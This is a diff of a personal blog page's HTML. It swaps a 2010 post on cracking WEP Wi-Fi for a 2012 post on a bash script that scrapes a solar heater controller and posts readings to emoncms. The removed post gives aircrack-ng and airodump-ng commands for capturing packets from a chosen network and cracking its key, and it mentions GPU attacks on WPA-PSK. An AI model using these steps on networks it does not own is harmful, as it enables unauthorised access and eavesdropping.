@@ -5,11 +5,12 @@
 <!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
 <head>
   <meta charset="utf-8">
-  <title>How to Hack a Wireless Network - x2q dot net</title>
+  <title>EMONCMS: SPIII Solar Controller &amp; Current Cost - x2q dot net</title>
   <meta name="author" content="x2q">
 
   
-  <meta name="description" content="WEP was intended to provide comparable confidentiality to a traditional wired network (in particular it does not protect users of the network from &hellip;">
+  <meta name="description" content="My father has got a solar water heater system with a SPIII Solar Water Heater Controller.
+The controller itself is some crappy closed source with a &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -18,7 +19,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1">
 
   
-  <link rel="canonical" href="http://www.x2q.net/blog/2010/04/03/hack-wireless-network/">
+  <link rel="canonical" href="http://www.x2q.net/blog/2012/10/11/emoncms-spiii-solar-controller-and-current-cost/">
   <link href="/favicon.png" rel="icon">
   <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
   <script src="/javascripts/modernizr-2.0.js"></script>
@@ -80,7 +81,7 @@
   
   <header>
     
-      <h1 class="entry-title">How to Hack a Wireless Network</h1>
+      <h1 class="entry-title">EMONCMS: SPIII Solar Controller &amp; Current Cost</h1>
     
     
       <p class="meta">
@@ -96,70 +97,109 @@
   
 
 
-<time datetime="2010-04-03T19:29:24+02:00" pubdate data-updated="true">Apr 3<span>rd</span>, 2010</time>
+<time datetime="2012-10-11T16:42:00+02:00" pubdate data-updated="true">Oct 11<span>th</span>, 2012</time>
         
       </p>
     
   </header>
 
 
-<div class="entry-content"><p><a href="http://en.wikipedia.org/wiki/Wired_Equivalent_Privacy">WEP</a> was intended to provide comparable confidentiality to a traditional wired network (in particular it does not protect users of the network from each other, but from outsiders), hence the name WEP.</p>
+<div class="entry-content"><p>My father has got a solar water heater system with a SPIII Solar Water Heater Controller.
+The controller itself is some crappy closed source with a bad interface (non-standard compliant HTML interface) - however it works.</p>
 
-<p>Despite the intention, several serious weaknesses were identified by <a href="http://en.wikipedia.org/wiki/Cryptanalysis">cryptanalysts</a> over the last years. The severity of the weaknesses means that any WEP protected network can be cracked using the right software within two minutes or less.</p>
+<p>In order to collect all environmental data from the house we decided to buy a Raspberry PI and a few Arduino devices.</p>
 
-<p>WEP was superseded by <a href="http://en.wikipedia.org/wiki/Wi-Fi_Protected_Access">Wi-Fi Protected Access</a> (also known as WPA) in 2003, and then by the full <a href="http://en.wikipedia.org/wiki/IEEE_802.11i-2004">IEEE 802.11i</a> standard (also known as WPA2) in 2004. Despite the weaknesses, WEP provides a level of security that can deter casual snooping.</p>
+<p>So far we are able to collect data from the SPIII Solar Water Heater Controller using <code>curl</code> and from the Current Cost device using the following bash code:</p>
 
-<p><strong>Hack Versus Crack</strong></p>
+<div><script src='https://gist.github.com/3872852.js?file='></script>
+<noscript><pre><code>#!/bin/bash
 
-<p>For your information - just to get the right jargon.</p>
+# Crontab
+#  # m h  dom mon dow   command
+#  */1 * * * * /home/raspberrypi/SPIII-Current-Cost.sh
 
-<p>The Eric S. Raymonds <a href="http://www.catb.org/jargon">Jargon File</a> contains a bunch of definitions of the term &#8221;<a href="http://en.wikipedia.org/wiki/Hacker_%28computer_security%29">hacker</a>&#8221;, most having to do with technical adeptness and a delight in solving problems and overcoming limits. The basic difference between a hacker and a cracker is this: hackers build things, crackers break them.</p>
+function update {
 
-<p><strong>Howto Conduct The Actual Crack</strong></p>
+    data=`curl -s --request GET --header &quot;X-ApiKey: &lt;api-key&gt;&quot; \
+    http://api.cosm.com/v2/feeds/&lt;feed-id&gt;.csv | awk -F &quot;\&quot;*,\&quot;*&quot; '{print &quot;el-&quot;$1&quot;:&quot;$3}' | tr '\n' ','`
 
-<p>It&#8217;s fairly easy to <a href="http://en.wikipedia.org/wiki/Password_cracking">crack</a> a <a href="http://en.wikipedia.org/wiki/Wired_Equivalent_Privacy">WEP</a> encrypted <a href="http://en.wikipedia.org/wiki/Wi-Fi">wireless network</a>, because the <a href="http://en.wikipedia.org/wiki/Wired_Equivalent_Privacy">WEP encryption</a> has some serious flaws in its design, flaws that makes it easy and fast to <a href="http://en.wikipedia.org/wiki/Password_cracking">crack</a> or hack.</p>
+    url=&quot;http://emoncms.org/api/post?apikey=&lt;api-key&gt;&amp;json={$data}&quot;
+    curl $url &gt; /dev/null 2&gt;&amp;1
 
-<p>Install <a href="http://www.aircrack-ng.org/">aircrack-ng</a> - on Debian or Ubuntu by:</p>
 
-<pre><code>sudo aptitude install aircrack-ng
-</code></pre>
+    data=`curl -s -u admin: http://192.168.1.99/1 \
+    | lynx -stdin -dump \
+    | sed 's/\///g' \
+    | sed 's/Gennemstr.mning/gennemstromning/g' \
+    | sed -n '4,12p' \
+    | tr &quot;[:upper:]&quot; &quot;[:lower:]&quot; \
+    | awk '{printf &quot;sol-&quot;$1&quot;:&quot;$2&quot;,&quot;}'`
 
-<p>Then start aircrack-ng to look for wireless networks:</p>
+    url=&quot;http://emoncms.org/api/post?apikey=&lt;api-key&gt;&amp;json={$data}&quot;
+    curl $url &gt; /dev/null 2&gt;&amp;1
+    sleep 1;
 
-<pre><code>sudo airodump-ng eth1
-</code></pre>
+    data=`curl -s -u admin: http://192.168.1.99/6 \
+    | lynx -stdin -dump \
+    | sed 's/kkal/ kkal/g' \
+    | sed 's/Total/total-kcal/g' \
+    | sed -n '7,7p' \
+    | tr &quot;[:upper:]&quot; &quot;[:lower:]&quot; \
+    | awk '{printf &quot;sol-&quot;$1&quot;:&quot;$2&quot;,sol-total-kwh:&quot;$2*0.00116222222}'`
 
-<p>Then notice the channel number of the wireless network you want to crack.</p>
+    url=&quot;http://emoncms.org/api/post?apikey=&lt;api-key&gt;&amp;json={$data}&quot;
+    curl $url &gt; /dev/null 2&gt;&amp;1
+    sleep 1;
 
-<pre><code>CH  1 ][ Elapsed: 9 mins ][ 2012-08-19 18:35
 
-BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
+    old=`cat /tmp/watth.data`
 
-70:71:BC:A6:FF:FF  -68      285      191    0   4  54e  WEP  WEP         wifi-0
-00:17:9A:F1:FF:FF  -77      599      104    0   6  54 . WEP  WEP         wifi-1
-4C:E6:76:C4:FF:FF  -38      926       60    0   2  54e  WPA2 CCMP   PSK  wifi-2
-C4:3D:C7:34:FF:FF  -62      476      397    0   8  54e  WPA  TKIP   PSK  wifi-3
-</code></pre>
+    current=`curl -s -u admin: http://192.168.1.99/6 \
+    | lynx -stdin -dump \
+    | sed 's/kkal/ kkal/g' \
+    | sed 's/Total/total-kcal/g' \
+    | sed -n '7,7p' \
+    | tr &quot;[:upper:]&quot; &quot;[:lower:]&quot; \
+    | awk '{printf &quot;%i&quot;, $2*1.163}'`
 
-<p>Quit aircrack-ng and start it again with med specific channel number to collect packages faster:</p>
+    echo $old
+    echo $current
+    let &quot;watt=($current-$old)&quot;
+    echo $watt
+    echo &quot;$current&quot; &gt; /tmp/watth.data
 
-<pre><code>sudo airodump-ng -c 4 -w dump eth1
-</code></pre>
 
-<p>Then wait and let it collect about 500K IVS and the try the do the actual crack:</p>
+    url=&quot;http://emoncms.org/api/post?apikey=&lt;api-key&gt;&amp;json={sol-watt:$watt}&quot;
+    curl $url &gt; /dev/null 2&gt;&amp;1
+    sleep 1;
 
-<pre><code>sudo aircrack-ng -b 0a:0b:0c:0d:0e:0f dump-01.cap
-</code></pre>
 
-<p>The MAC after the -b option is the BSSID of the target and dump-01.cap the file containing the captured packets.</p>
+    data=`curl -s -u admin: http://192.168.1.99/2 \
+    | lynx -stdin -dump -display_charset=UTF-8 \
+    | sed 's/Elektrisk varme/Elektrisk-varme/g' \
+    | sed 's/Aktuelt system/Aktuelt-system/g' \
+    | sed 's/stoppet/0/g' \
+    | sed 's/k.*rer$/1/g' \
+    | sed 's/N\.C\./0/g' \
+    | sed 's/N\.O\./1/g' \
+    | sed 's/\///g' \
+    | sed -n '4,10p' \
+    | tr &quot;[:upper:]&quot; &quot;[:lower:]&quot; \
+    | awk '{printf &quot;sol-&quot;$1&quot;:&quot;$2&quot;,&quot;}'`
 
-<p><strong>Only WEP Encrypted Networks</strong></p>
+    url=&quot;http://emoncms.org/api/post?apikey=&lt;api-key&gt;&amp;json={$data}&quot;
+    curl $url &gt; /dev/null 2&gt;&amp;1
+}
 
-<p>Keep in mind that this approach is only usable in relation to WEP encrypted wireless networks, and cannot be used to crack WPA and WPA2 encrypted networks.</p>
+update
+sleep 30;
+update
+</code></pre></noscript></div>
 
-<p>However, there is a new project called <a href="http://code.google.com/p/pyrit/">Pyrit</a>,which is currently under it&#8217;s way. Pyrit takes a step ahead in attacking WPA-PSK and WPA2-PSK, the protocol that today de-facto protects public <a href="http://en.wikipedia.org/wiki/Wi-Fi">WIFI</a>-airspace. The project&#8217;s goal is to estimate the real-world security provided by these protocols. Pyrit does not provide <a href="http://en.wikipedia.org/wiki/Binary_file">binary</a> files or wordlists and does not encourage anyone to participate or engage in any harmful activity. This is a research project, not a cracking tool - keep that in mind ;-)</p>
 
-<p>Pyrit&#8217;s implementation allows to create massive databases, pre-computing part of the WPA/WPA2-PSK authentication phase in a space-time-tradeoff. The performance gain for real-world-attacks is in the range of three orders of magnitude which urges for re-consideration of the protocol&#8217;s security. Exploiting the computational power of <a href="http://en.wikipedia.org/wiki/Graphics_processing_unit">GPUs</a>, this is currently by far the most powerful attack against one of the world&#8217;s most used security-protocols.</p>
+<p>The result so far in emoncms:</p>
+
+<p><img src="http://static.x2q.net/emoncms.png"></p>
 </div>
 
 
@@ -182,12 +222,12 @@ C4:3D:C7:34:FF:FF  -62      476      397    0   8  54e  WPA  TKIP   PSK  wifi-3
   
 
 
-<time datetime="2010-04-03T19:29:24+02:00" pubdate data-updated="true">Apr 3<span>rd</span>, 2010</time>
+<time datetime="2012-10-11T16:42:00+02:00" pubdate data-updated="true">Oct 11<span>th</span>, 2012</time>
       
 
 <span class="categories">
   
-    <a class='category' href='/blog/categories/cracking/'>Cracking</a>
+    <a class='category' href='/blog/categories/linux/'>Linux</a>, <a class='category' href='/blog/categories/raspberry/'>Raspberry</a>
   
 </span>
 
@@ -196,7 +236,7 @@ C4:3D:C7:34:FF:FF  -62      476      397    0   8  54e  WPA  TKIP   PSK  wifi-3
     
       <div class="sharing">
   
-  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://www.x2q.net/blog/2010/04/03/hack-wireless-network/" data-via="" data-counturl="http://www.x2q.net/blog/2010/04/03/hack-wireless-network/" >Tweet</a>
+  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://www.x2q.net/blog/2012/10/11/emoncms-spiii-solar-controller-and-current-cost/" data-via="" data-counturl="http://www.x2q.net/blog/2012/10/11/emoncms-spiii-solar-controller-and-current-cost/" >Tweet</a>
   
   
   
@@ -207,8 +247,8 @@ C4:3D:C7:34:FF:FF  -62      476      397    0   8  54e  WPA  TKIP   PSK  wifi-3
     
     <p class="meta">
       
+        <a class="basic-alignment left" href="/blog/2012/10/11/ubuntu-sudo-without-password/" title="Previous Post: Ubuntu: Sudo without password">&laquo; Ubuntu: Sudo without password</a>
       
-        <a class="basic-alignment right" href="/blog/2010/04/16/mysql-identify-worst-performing-indexes/" title="Next Post: MySQL: Identify The Worst Performing Indexes">MySQL: Identify The Worst Performing Indexes &raquo;</a>
       
     </p>
   </footer>
@@ -282,8 +322,8 @@ C4:3D:C7:34:FF:FF  -62      476      397    0   8  54e  WPA  TKIP   PSK  wifi-3
       
         
         // var disqus_developer = 1;
-        var disqus_identifier = 'http://www.x2q.net/blog/2010/04/03/hack-wireless-network/';
-        var disqus_url = 'http://www.x2q.net/blog/2010/04/03/hack-wireless-network/';
+        var disqus_identifier = 'http://www.x2q.net/blog/2012/10/11/emoncms-spiii-solar-controller-and-current-cost/';
+        var disqus_url = 'http://www.x2q.net/blog/2012/10/11/emoncms-spiii-solar-controller-and-current-cost/';
         var disqus_script = 'embed.js';
       
     (function () {
